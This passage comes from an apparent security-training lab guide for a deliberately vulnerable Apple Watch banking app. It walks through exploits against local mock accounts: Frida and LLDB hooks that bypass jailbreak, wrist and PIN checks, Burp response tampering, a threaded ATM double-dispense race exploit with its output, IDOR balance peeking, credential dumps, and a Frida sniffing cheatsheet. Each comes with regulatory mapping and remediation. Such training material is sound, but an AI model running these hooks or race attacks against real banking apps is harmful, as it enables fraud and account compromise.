  1. **Two-Phase Commit with Cryptographic Confirmation Nonce**:
     The watch UI must remain in a "PENDING CONFIRMATION" state until the core banking system returns a cryptographically signed acknowledgement token containing a server timestamp and card status signature.
  2. **Mandatory Failure Warning & Emergency Contact Modal**:
     If network timeout occurs, immediately revert the local UI state and present an explicit warning dialog: `"Freeze Request Unconfirmed. Card may remain active. Tap to Call Bank Hotline 1500888 immediately."`
  3. **Mutual Request Signing**:
     Protect freeze toggle requests with device-bound HMAC signatures generated by keys stored in the Apple Watch Secure Enclave.

---

### Scenario 10: Client-Side iOS Jailbreak Anti-Tamper Detection Bypass (V-07)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.8)
- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-312 (Cleartext Storage of Sensitive Information), OWASP MASVS-RESILIENCE-1.
- **Description**:
  The Nexora banking companion implements an anti-tamper security module (`SecurityCheckModule.swift`) designed to halt execution if a jailbroken environment, Cydia substrate, or Frida instrumentation is identified.
  However, this defense mechanism is purely client-side "security theater":
  1. **Static Heuristic Filesystem Checks**: Evaluates standard hardcoded filesystem paths (`/Applications/Cydia.app`, `/Library/MobileSubstrate/MobileSubstrate.dylib`, `/usr/sbin/sshd`, `/etc/apt`) and sandbox write probes.
  2. **Insecure Plist Bypass Switch**: The audit function directly evaluates `InsecureStorage.shared.isJailbreakBypassActive()`, reading the unencrypted `UserDefaults` key `nexora_bypass_jailbreak_check`. Attackers can permanently disable all jailbreak detection by altering this plist setting.
  3. **Trivial Userland Hooking**: Attackers using Frida can hook `NSFileManager.defaultManager.fileExistsAtPath:` to return `false` for any monitored path in fewer than 10 lines of JavaScript.
- **Root Cause Code**:
  - [`ios/NexoraWatch/SecurityCheckModule.swift`](file:///ios/NexoraWatch/SecurityCheckModule.swift#L28-L55):
    ```swift
    public func runIntegrityAudit() {
        if InsecureStorage.shared.isJailbreakBypassActive() {
            // [V-R02 Bypass]: Security check defeated by client-side override
            isJailbroken = false
            fridaDetected = false
            detectionSummary = "Bypassed via Client Flag ✓"
            return
        }
        
        var findings: [String] = []
        // Filesystem path check vulnerable to Frida hooking
        for path in jailbreakFilePaths {
            if FileManager.default.fileExists(atPath: path) {
                findings.append("Found: \(path)")
            }
        }
    ```
- **Exploitation & Reproduction**:
  1. **Method A — Modifying UserDefaults Plist via Terminal / Simulator**:
     ```bash
     # Read current bypass status
     defaults read com.nexorabank.omniwear.watchkitapp nexora_bypass_jailbreak_check
     
     # Force bypass flag to TRUE
     defaults write com.nexorabank.omniwear.watchkitapp nexora_bypass_jailbreak_check -bool true
     ```
  2. **Method B — Dynamic Runtime Hooking (`bypass_jailbreak.js`)**:
     ```javascript
     /* bypass_jailbreak.js — Runtime Jailbreak Detection Hook */
     if (ObjC.available) {
         console.log("[*] Intercepting NSFileManager fileExistsAtPath...");
         var NSFileManager = ObjC.classes.NSFileManager;
         var hook = NSFileManager["- fileExistsAtPath:"];

         Interceptor.attach(hook.implementation, {
             onEnter: function (args) {
                 var path = ObjC.Object(args[2]).toString();
                 this.isJailbreakPath = false;
                 var signatures = ["Cydia", "MobileSubstrate", "sshd", "apt", "bash", "bin"];
                 for (var i = 0; i < signatures.length; i++) {
                     if (path.indexOf(signatures[i]) !== -1) {
                         this.isJailbreakPath = true;
                         console.log("  [+] Spoofing non-existence of jailbreak artifact: " + path);
                         break;
                     }
                 }
             },
             onLeave: function (retval) {
                 if (this.isJailbreakPath) {
                     retval.replace(ptr(0)); // Return NO (path does not exist)
                 }
             }
         });

         // Invalidate in-memory bypass flag
         var InsecureStorage = ObjC.classes.InsecureStorage;
         if (InsecureStorage) {
             var storage = InsecureStorage.shared();
             storage.setJailbreakBypass_(1);
             console.log("[+] InsecureStorage.setJailbreakBypass(true) executed.");
         }
     }
     ```
     Execute hook:
     ```bash
     frida -U -n "VulnerableBankApp" -l bypass_jailbreak.js
     ```
  3. **Expected Output**:
     - Terminal console logs all intercepted paths returning `NO`.
     - The application integrity status switches to: `"Integrity Clean (Bypassed via Client Flag ✓)"`, granting full access on compromised devices.
- **Regulatory Impact**:
  - **POJK 11/POJK.03/2022 Pasal 25**: Mandates banks to ensure client-side security integrity controls are robust against local bypass.
  - **PCI-DSS v4.0 Requirement 10.5 & 11.5**: Anti-tampering controls and file integrity monitoring must not be defeatable via client-side configuration changes.
- **Enterprise Remediation**:
  1. **Hardware-Backed Remote Attestation (Apple App Attest)**:
     Replace heuristic filesystem checks with Apple's **DeviceCheck** and **DCAppAttestService**. App Attest generates hardware-backed keys inside the Secure Enclave, which are validated cryptographically against Apple's attestation servers.
  2. **Server-Side Challenge-Response Architecture**:
     Enforce a server-side nonce verification model: the backend supplies a cryptographic challenge on login, which must be signed by the Secure Enclave attestation key. Nonce replay or missing attestation blocks all API transactions.

---

### Scenario 11: CISO Governance & Regulatory Compliance Assessment (POJK 11 / PCI-DSS v4.0)
- **Severity**: **HIGH** (Severe Regulatory Violation & Operating Risk)
- **Audit Frameworks Evaluated**:
  - **OJK POJK 11/POJK.03/2022**: Penyelenggaraan Teknologi Informasi oleh Bank Umum.
  - **Bank Indonesia PADG 24/1/PADG/2022**: Standar Nasional Open API Pembayaran (SNAP) & QRIS Dinamis.
  - **PCI-DSS v4.0**: Payment Card Industry Data Security Standard.
- **Description & Executive Audit Summary**:
  Comprehensive technical evaluation of the Nexora iOS and watchOS ecosystem across all 10 preceding scenarios reveals systematic architecture-level non-compliance with Indonesian financial sector regulations and international payment card data security standards.
  Storage of cleartext tokens in `UserDefaults`, unencrypted inter-device `WCSession` dictionaries, race condition vulnerabilities in ATM cash dispensing, and unauthenticated 2FA transaction approvals represent direct compliance failures that trigger regulatory sanctions from the Financial Services Authority (OJK) and Bank Indonesia.
- **Comprehensive Regulatory Mapping Table**:

| Regulatory Standard / Mandate | Legal Requirement & Intent | Observed Implementation Flaw | Compliance Status | Business Impact & Penalty |
|---|---|---|---|---|
| **POJK 11/POJK.03/2022 Pasal 25** | Perlindungan data dan integritas keamanan pada perangkat akhir (endpoint) nasabah. | Kredensial JWT, Quick-PIN 4-digit, dan nomor rekening tersimpan dalam format teks terbuka di file `.plist` sandboxed container jam. | ❌ **NON-COMPLIANT** | Sanksi administratif OJK, denda finansial bertahap, dan perintah penghentian sementara operasional produk wearable banking. |
| **POJK 11/POJK.03/2022 Pasal 31** | Penerapan Multi-Factor Authentication (MFA) yang mengikat pada transaksi transfer bernilai tinggi. | Otorisasi transfer dana Rp 50.000.000 hanya menggunakan interaksi notifikasi smartwatch tanpa tanda tangan kriptografi Secure Enclave atau otentikasi biometrik `LAContext`. | ❌ **NON-COMPLIANT** | Kewajiban ganti rugi 100% dana nasabah yang hilang akibat fraud transaksi ketiadaan MFA memadai. |
| **Bank Indonesia PADG 24/1/PADG/2022** | Tata cara implementasi SNAP QRIS Dinamis dengan validasi nonce dan masa kedaluwarsa ketat. | Payload QRIS memuat token transaksi statis (`A016304E8A2`) tanpa validasi masa berlaku (freshness timestamp) pada core backend, rentan serangan replay. | ❌ **NON-COMPLIANT** | Pencabutan lisensi Penyelenggara Jasa Pembayaran (PJP) dan denda kepatuhan Bank Indonesia. |
| **PCI-DSS v4.0 Req 3.4 & 3.5** | Melindungi Primary Account Number (PAN) dan data otentikasi sensitif pada seluruh media penyimpanan. | Data kartu virtual (`NX-VIRT-4401`) dan riwayat saldo tersimpan tanpa enkripsi kuat AES-256 pada disk klien jam tangan. | ❌ **FAIL** | Denda acquiring bank bulanan (USD 5.000 - USD 100.000), penurunan PCI merchant tier, dan audit investigasi forensik PFI wajib. |
| **PCI-DSS v4.0 Req 4.1** | Melindungi data pemegang kartu saat transit melalui jaringan terbuka atau nirkabel publik. | Paket komunikasi Bluetooth LE `WCSession` mentransmisikan saldo dan instruksi debit dalam format Objective-C dictionary tanpa enkripsi lapis aplikasi. | ❌ **FAIL** | Kerentanan terhadap pembajakan transaksi man-in-the-middle di ruang publik nirkabel. |
| **PCI-DSS v4.0 Req 6.2 & 6.5** | Memastikan perangkat lunak bebas dari kerentanan umum seperti Race Condition dan Brute-Force. | Endpoint verifikasi ATM Cardless Cash `/api/atm/cardless-cash/verify` rentan race condition double-dispense dan tidak menerapkan rate limiting OTP. | ❌ **FAIL** | Kerugian finansial kas fisik bank langsung pada unit ATM terminal akibat eksploitasi multi-threading. |

- **CISO Executive Scorecard**:
  - **Overall Enterprise Posture**: `24 / 100` (CRITICAL RISK — AUDIT FAILED)
  - **Vulnerability Breakdown**:
    - **CRITICAL** (2 Findings): V-AP02 (Plaintext WCSession Dictionary), V-AP04 (High-Value Rp 50.000.000 2FA Hijack).
    - **HIGH** (5 Findings): V-AP01 (UserDefaults Plist Storage), V-AP03 (Unthrottled Quick-PIN), V-AP06 (SNAP QRIS Replay), V-B01 (Remote Balance Injection), V-L04 (ATM Cardless Race Condition & Brute-Force).
    - **MEDIUM** (3 Findings): V-AP05 (Wrist-Off Sensor Spoofing), V-W09 (Card Freeze Desynchronization), V-07 (Jailbreak Detection Bypass).
- **Prioritized 30-60-90 Day CISO Remediation Roadmap**:
  1. **Phase 1: Days 1–30 (Immediate Containment & Storage Migration)**:
     - Migrate all token, PIN, and account persistence from `UserDefaults` to **Apple Keychain Services** (`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`).
     - Refactor `/api/atm/cardless-cash/verify` to execute atomic status transition: `UPDATE cardless_cash_tokens SET status = 'DISPENSED' WHERE token = ? AND status = 'ACTIVE' AND expires_at > datetime('now');` with distributed locking.
     - Implement rate-limiting on all OTP endpoints (max 3 attempts per 15 minutes).
  2. **Phase 2: Days 31–60 (Channel Cryptography & Biometric Binding)**:
     - Implement application-layer **AES-256-GCM** encryption over `WCSession` with ephemeral ECDH P-256 key agreement.
     - Require mandatory `LAContext` biometric authentication (FaceID / Apple Watch Passcode) and Secure Enclave cryptographic signature for all wire transfers exceeding Rp 10.000.000.
     - Add two-phase commit acknowledgement with server signature for Emergency Card Freeze actions.
  3. **Phase 3: Days 61–90 (Hardware Attestation & Governance Formalization)**:
     - Replace client-side heuristic jailbreak checks with **Apple App Attest** (DeviceCheck API) and server-side challenge verification.
     - Enforce SNAP PADG 24/1/PADG/2022 compliance: 60-second dynamic QRIS freshness windows, one-time nonce validation, and HMAC request signing.
     - Complete formal re-audit and submit compliance report to OJK Department of Banking Supervision.

---

## ⌚ 6. Panduan Pentest Standalone watchOS + Mac (Tanpa Companion iPhone)

Bab khusus ini dirancang khusus bagi penetration tester dan security researcher yang melakukan pengujian keamanan smartwatch **secara mandiri (standalone)** hanya menggunakan **Apple Watch (Simulator atau Hardware Fisik)** dan **Laptop Mac/MacBook penguji**, **100% tanpa memerlukan aplikasi companion iPhone**.

Klien Apple Watch Nexora OmniWear (`com.nexorabank.omniwear.watchkitapp`) memiliki arsitektur dual-mode: selain mampu berkomunikasi via Bluetooth LE (`WCSession`), jam tangan ini juga memiliki antarmuka jaringan HTTP mandiri (`WatchNetworkManager.swift`), media penyimpanan sandboxed lokal (`InsecureStorage.swift`), registrasi Custom URL Scheme (`nexorabank://`), serta modul runtime Objective-C dinamis yang dapat diakses langsung oleh toolchain riset pada macOS (Xcode `simctl`, LLDB debugger, Frida, Burp Suite, dan Python multi-threading).

---

### Standalone Challenge 1: Forensic Sandbox Plist & Cache Dump via simctl (Pillar 1)
- **Vulnerability Code**: `V-AP01` & `V-AP01b`
- **Klasifikasi Kelemahan**: CWE-312 (Cleartext Storage of Sensitive Information), OWASP MASVS-STORAGE-1
- **Target Pentest**: Direktori sandboxed container watchOS:
  - `Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist`
  - `Library/Caches/com.nexorabank.omniwear.watchkitapp/Cache.db`
- **Konsep Serangan**:
  Aplikasi watchOS menyimpan token otentikasi JWT, Quick-PIN 4-digit nasabah, nomor rekening primer (`NX-8492014`), dan saldo rupiah secara tidak terenkripsi ke dalam `UserDefaults.standard`. Selain itu, respon HTTP dari server perbankan di-cache ke dalam database SQLite internal `Cache.db`. Peneliti di laptop Mac dapat mengekstraksi seluruh kredensial ini menggunakan utilitas `simctl`.
- **Langkah-Langkah Eksploitasi (Terminal Mac)**:
  1. Dapatkan path direktori sandboxed data aplikasi watchOS di Mac:
     ```bash
     CONTAINER_DIR=$(xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data)
     echo "[+] Sandboxed Watch Container: $CONTAINER_DIR"
     cd "$CONTAINER_DIR"
     ```
  2. Ekstraksi dan periksa file `.plist` preferensi lokal:
     ```bash
     plutil -p Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist
     ```
     **Output Bukti Forensik**:
     ```json
     {
       "nexora_account_holder" => "Alexander Vance"
       "nexora_account_number" => "NX-8492014"
       "nexora_auth_token" => "eyWatchMockToken.eyJzdWIiOiJhbGV4YW5kZXIudmFuY2UiLCJhbW91bnQiOjg4ODg4ODAwMC4wfQ=="
       "nexora_cached_balance" => 888888000.0
       "nexora_currency" => "IDR"
       "nexora_quick_pin" => "1234"
     }
     ```
  3. Dump respon HTTP yang tersimpan di SQLite `Cache.db`:
     ```bash
     sqlite3 "Library/Caches/com.nexorabank.omniwear.watchkitapp/Cache.db" \
       "SELECT request_key, receiver_data FROM cfurl_cache_receiver_data;"
     ```
- **Simulasi Interaktif di Jam**:
  - Buka menu **Security Audit Lab -> P1 (Storage & Cryptography)**.
  - Tekan **V-AP01: Standalone Plist Dump** -> Muncul pesan `[V-AP01] Standalone Plist Dump: PIN=1234, Acct=NX-8492014`.
  - Tekan **V-AP01b: Standalone Cache.db Dump** -> Memverifikasi keberadaan database cache cleartext.

---

### Standalone Challenge 2: Direct Cleartext Wi-Fi HTTP MITM & Reversal via Burp Suite (Pillar 2)
- **Vulnerability Code**: `V-B01` / Direct HTTP Relay
- **Klasifikasi Kelemahan**: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-345 (Insufficient Verification of Data Authenticity)
- **Target Pentest**: `WatchNetworkManager.swift` direct HTTP queries ke core backend `http://<Mac-IP>:5000`.
- **Konsep Serangan**:
  Karena `Info.plist` watchOS mengaktifkan `NSAllowsArbitraryLoads = true` dan Swift `URLSession` tidak menerapkan SSL/TLS certificate pinning, Apple Watch dapat langsung melakukan query HTTP tanpa enkripsi melalui koneksi Wi-Fi ke mesin penguji. Peneliti dapat mengarahkan lalu lintas jam ke Burp Suite Proxy di Mac dan memanipulasi saldo rekening maupun riwayat transaksi saat transit.
- **Langkah-Langkah Eksploitasi (Terminal & Burp Suite Mac)**:
  1. Jalankan Burp Suite di Mac, pastikan listener aktif di `0.0.0.0:8080`.
  2. Arahkan koneksi jaringan watch simulator ke Burp Suite, atau atur base URL jam tangan di `InsecureStorage` mengarah ke port proxy atau backend (`http://127.0.0.1:5000`).
  3. Lakukan interupsi (Proxy Intercept ON) untuk endpoint `/check_balance/NX-8492014`:
     - Respon asli dari backend:
       ```json
       {"accountNumber":"NX-8492014","balance":888888000.0,"currency":"IDR"}
       ```
     - Ubah isi respon HTTP di Burp Suite menjadi:
       ```json
       {"accountNumber":"NX-8492014","balance":9999999999.0,"currency":"IDR"}
       ```
  4. Teruskan paket (Forward). Perhatikan layar Apple Watch: saldo seketika berubah menampilkan saldo palsu `Rp 9.999.999.999`.
- **Simulasi Interaktif di Jam**:
  - Buka **Audit Lab -> P2 (Transport & Bridge)**.
  - Tekan **V-B01: Standalone Cleartext Wi-Fi MITM** -> Jam mengeksekusi request HTTP langsung ke Flask port 5000 dan menampilkan respon berhasil `[V-B01] Standalone HTTP OK: Rp ...`.

---

### Standalone Challenge 3: Standalone Runtime Memory Swizzling via LLDB & Frida (Pillar 3)
- **Vulnerability Code**: `V-AP05` & `V-AP03`
- **Klasifikasi Kelemahan**: CWE-693 (Protection Mechanism Failure), CWE-305 (Authentication Bypass by Primary Weakness)
- **Target Pentest**: Target method Objective-C dinamis:
  - `-[WristSensorManager isWristAttachedToBody]`
  - `-[InsecureStorage verifyPin:]`
- **Konsep Serangan**:
  Aplikasi watchOS bergantung pada nilai pengembalian method kelas Swift/ObjC untuk mengontrol apakah jam sedang terpasang di pergelangan tangan (wrist-detect) dan apakah PIN 4-digit yang dimasukkan valid. Dengan menempelkan debugger LLDB atau Frida ke proses `NexoraWatch` di Mac, peneliti dapat men-swizzle nilai balik method tersebut secara langsung di memori RAM, sehingga jam tangan tetap terbuka (unlocked) walaupun dilepas dari pergelangan tangan, serta PIN apapun akan diterima.
- **Langkah-Langkah Eksploitasi**:
  1. **Metode A: Runtime Patching Menggunakan LLDB (Bawaan Xcode Mac)**:
     ```bash
     # Pasang LLDB ke proses jam yang sedang berjalan
     lldb -n NexoraWatch
     ```
     Di dalam prompt LLDB, pasang breakpoint command untuk memaksa `isWristAttachedToBody` selalu mengembalikan nilai `1` (`true`):
     ```lldb
     (lldb) breakpoint set -n "-[WristSensorManager isWristAttachedToBody]"
     (lldb) breakpoint command add 1
     > thread return 1
     > continue
     > DONE
     (lldb) c
     ```
     *Hasil*: Ketika smartwatch dilepaskan atau fungsi `triggerWristOff()` dipanggil, proteksi layar terkunci (`WristLockoutView`) terabaikan sepenuhnya!
  2. **Metode B: Dynamic Instrumentation Menggunakan Frida**:
     Jalankan script otomatis yang telah disediakan di repository:
     ```bash
     frida -n NexoraWatch -l scripts/frida_bypass_wrist.js
     ```
     Script ini secara otomatis mem-patch `-[WristSensorManager isWristAttachedToBody]` dan `-[InsecureStorage verifyPin:]`. Setiap PIN sembarang (misal `0000`) akan diverifikasi sebagai berhasil (`PASS`).
- **Simulasi Interaktif di Jam**:
  - Buka **Audit Lab -> P3 (Sensors & Anti-Tamper)**.
  - Tekan **V-AP05: Standalone LLDB/Frida Wrist Hook** -> Jam mengaktifkan mode simulasi hook: status `isWristAttachedToBody=true`.
  - Kembali ke Dashboard dan tekan **Test Wrist Lock** -> Layar tetap terbuka tanpa terkunci.

---

### Standalone Challenge 4: Standalone ATM Double-Dispense Race Condition via Python Multi-threading (Pillar 4)
- **Vulnerability Code**: `V-L04`
- **Klasifikasi Kelemahan**: CWE-362 (Race Condition / TOCTOU), CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **Target Pentest**: Endpoint ATM Cardless Cash backend:
  - Generate: `POST /api/atm/cardless-cash/generate`
  - Verify/Dispense: `POST /api/atm/cardless-cash/verify`
- **Konsep Serangan**:
  Fitur tarik tunai tanpa kartu di ATM memungkinkan nasabah membuat kode OTP 6-digit langsung dari jam. Endpoint verifikasi memiliki jeda eksekusi non-atomik sebesar ~60 milidetik antara pembacaan token aktif (`SELECT`) dan pembaharuan status token menjadi terpakai (`UPDATE status = 'DISPENSED'`). Peneliti di Mac dapat memanfaatkan script Python multi-threading (`scripts/exploit_double_dispense.py`) untuk mengirimkan 5 hingga 8 permintaan verifikasi simultan dalam jendela TOCTOU tersebut, menyebabkan ATM mencairkan uang tunai dua kali lipat untuk satu kode penarikan.
- **Langkah-Langkah Eksploitasi (Terminal Mac)**:
  1. Pada Apple Watch: Masuk ke menu **Cardless Cash** dan tekan **Generate New OTP** (atau buka **Audit Lab -> P4** dan tekan **V-L04: Standalone ATM Double-Dispense Race**).
  2. Catat kode OTP 6-digit yang muncul di layar jam (misal: `849201`).
  3. Di Terminal Mac, jalankan script eksploitasi multi-threading:
     ```bash
     python scripts/exploit_double_dispense.py 849201
     ```
     **Output Eksekusi Exploit**:
     ```text
     =================================================================
       NEXORA OMNIWEAR STANDALONE ATM RACE CONDITION EXPLOIT (V-L04)
     =================================================================
     [*] Target Endpoint: http://127.0.0.1:5000/api/atm/cardless-cash/verify
     [*] Attacking with OTP Token: 849201
     [*] Firing 5 concurrent threads within the 60ms TOCTOU window...

     [+] Verification Responses:
       Thread 1 -> HTTP 200: {'amount': 100000.0, 'status': 'DISPENSED'} ✓ [DISPENSED]
       Thread 2 -> HTTP 200: {'amount': 100000.0, 'status': 'DISPENSED'} 🔥 [DOUBLE DISPENSE]
       Thread 3 -> HTTP 400: {'error': 'Token already redeemed'} ✗ [REJECTED]
       Thread 4 -> HTTP 400: {'error': 'Token already redeemed'} ✗ [REJECTED]
       Thread 5 -> HTTP 400: {'error': 'Token already redeemed'} ✗ [REJECTED]

     =================================================================
     [!] VULNERABILITY CONFIRMED: Token was dispensed 2 times!
     [!] ATM hardware dispensed cash twice, mutating SQLite ledger twice.
     =================================================================
     ```
  4. Verifikasi mutasi ganda pada database SQLite perbankan di Mac:
     ```bash
     sqlite3 backend/nexora_vault.db "SELECT id, from_account, amount, description, timestamp FROM transactions WHERE description LIKE '%Cardless ATM%' ORDER BY id DESC LIMIT 2;"
     ```
     Tampak dua baris transaksi debit masing-masing sebesar Rp 100.000 dengan timestamp identik tercatat pada saldo nasabah.

---

### Standalone Challenge 5: Standalone Wrist BOLA / IDOR Account Peeking via Deep Link & Direct API (Pillar 4)
- **Vulnerability Code**: `V-AP07` / Broken Object Level Authorization
- **Klasifikasi Kelemahan**: CWE-639 (Authorization Bypass Through User-Controlled Key), OWASP API1:2023
- **Target Pentest**:
  - URL Scheme: `nexorabank://account?num=<accountNumber>`
  - Direct HTTP Endpoint: `GET /check_balance/<accountNumber>`
- **Konsep Serangan**:
  Aplikasi jam mendaftarkan penangan Custom URL Scheme (`nexorabank://`) di `Info.plist` dan `ContentView.swift`. Penangan ini langsung mengeset nomor rekening aktif dan mem-bypass autentikasi Quick-PIN tanpa memvalidasi sesi kepemilikan. Di sisi backend, endpoint `/check_balance/<accountNumber>` mengembalikan saldo rekening apapun tanpa memerlukan JWT Bearer token atau validasi otorisasi. Peneliti dapat mengintip rekening nasabah VIP lain, seperti Evelyn Sterling (`NX-7391048`), langsung dari Mac ke layar Apple Watch!
- **Langkah-Langkah Eksploitasi (Terminal Mac)**:
  1. Trigger Deep Link BOLA dari Mac ke Apple Watch simulator:
     ```bash
     xcrun simctl openurl booted "nexorabank://account?num=NX-7391048"
     ```
  2. Amati layar jam tangan:
     - Aplikasi langsung melompati layar kunci PIN (Quick-PIN Bypass).
     - Menampilkan nomor rekening `NX-7391048` (Evelyn Sterling).
     - Menampilkan saldo rekening Evelyn Sterling: `Rp 70.250.000`.
  3. Verifikasi ketiadaan otorisasi melalui curl di Mac:
     ```bash
     curl -s http://127.0.0.1:5000/check_balance/NX-7391048 | jq .
     ```
     Respon:
     ```json
     {
       "accountNumber": "NX-7391048",
       "balance": 70250000.0,
       "currency": "IDR"
     }
     ```
  4. Coba rekening target nasabah lainnya (misal: Marcus Holloway `NX-9201482`):
     ```bash
     xcrun simctl openurl booted "nexorabank://account?num=NX-9201482"
     ```
     Layar jam tangan seketika memperbarui tampilan ke saldo Marcus Holloway (`Rp 18.750.000`).
- **Simulasi Interaktif di Jam**:
  - Buka **Audit Lab -> P4 (Authentication & 2FA)**.
  - Tekan **V-AP07: Standalone BOLA (Evelyn Sterling)** -> Jam mengeksekusi query langsung ke backend dan mengonfirmasi eksposur: `[V-AP07] BOLA Expose: NX-7391048 = Rp 70.250.000`.
  - Tekan **Reset Account to NX-8492014** untuk mengembalikan sesi ke nasabah default Alexander Vance.

---

## 🛠️ 7. Frida & Cycript Cheatsheet for iOS & watchOS

### WCSession Sniffer Hook Script
```javascript
// sniff_wcsession.js
if (ObjC.available) {
    var hook = ObjC.classes.WatchSessionManager["- session:didReceiveMessage:replyHandler:"];
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            var msg = new ObjC.Object(args[3]);
            console.log("\n[🚨 WCSESSION SNIFFED PACKET]");
            console.log(msg.toString());
        }
    });
}
```

### Dump UserDefaults from Runtime
```javascript
// dump_userdefaults.js
var defaults = ObjC.classes.NSUserDefaults.standardUserDefaults();
console.log(defaults.dictionaryRepresentation().toString());
```

---

## 🛡️ 8. Regulatory Compliance Matrix & Enterprise Remediation

| Vulnerability Code | Scenario Name | Business Risk | Regulatory Violation | Production Remediation |
|---|---|---|---|---|
| **V-AP01** | Insecure Plist Storage | Token and Quick-PIN theft from backups. | POJK 11/2022 Pasal 25, PCI-DSS Req 3.4 | Migrate storage to **Apple Keychain Services** (`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`). |
| **V-AP02** | WCSession Cleartext Sync | Financial data tampered over BLE. | PCI-DSS Req 4.1, POJK 11/2022 Pasal 26 | Enforce application-layer AES-256-GCM encryption with ephemeral ECDH P-256 keys. |
| **V-AP03** | Unthrottled Quick-PIN | 4-digit PIN brute-forced in minutes. | NIST SP 800-63B, OWASP MASVS-AUTH | Implement exponential delay backoff (1s, 2s, 4s, 8s) and lockout after 5 failed attempts. |
| **V-AP04** | OOB Rp 50.000.000 Transfer Hijack | Fraudulent wire transfer authorization. | POJK 11/2022 Pasal 31 (MFA) | Require biometric authorization via `LAContext` and Secure Enclave asymmetric signature. |
| **V-AP05** | Wrist-Off Sensor Spoofing | Stolen watch remains usable off-wrist. | ISO 27001 A.8.1, POJK 11/2022 | Validate wrist status via native hardware queries verified on backend. |
| **V-AP06** | Dynamic QRIS Replay | Replayable merchant checkout tokens. | SNAP PADG 24/1/PADG/2022 | Implement 60-second TOTP nonce freshness and backend HMAC signature validation. |
| **V-B01** | Remote Balance Injection | Spoofed balance display on smartwatch screen. | POJK 11/2022 Pasal 25, OWASP MASVS-NETWORK | Validate session tokens and sign bridge payload with HMAC-SHA256. |
| **V-L04** | ATM Cardless Race Condition & Brute-Force | Double-dispense cash theft at ATM terminals. | POJK 11/2022 Pasal 25 & 31, PCI-DSS Req 6.2 | Enforce distributed Redis mutex locks, atomic token state transition, and 3-attempt OTP throttling. |
| **V-W09** | Wrist Card Freeze Desynchronization | Stolen card remains active while UI indicates frozen. | POJK 11/2022 Pasal 25, PCI-DSS Req 4.1 | Implement two-phase commit with cryptographic confirmation nonce before UI update. |
| **V-07** | Client-Side Jailbreak Detection Bypass | Tampered runtime environments undetected. | POJK 11/2022 Pasal 25, PCI-DSS Req 10.5 | Adopt Apple DeviceCheck and DCAppAttestService hardware-backed attestation. |
| **GOV-01** | CISO Regulatory Audit Failure | Sanctions, operating license revocation, financial penalties. | POJK 11/2022, SNAP QRIS, PCI-DSS v4.0 | Implement prioritized 30-60-90 day remediation roadmap across storage, transport, and auth layers. |
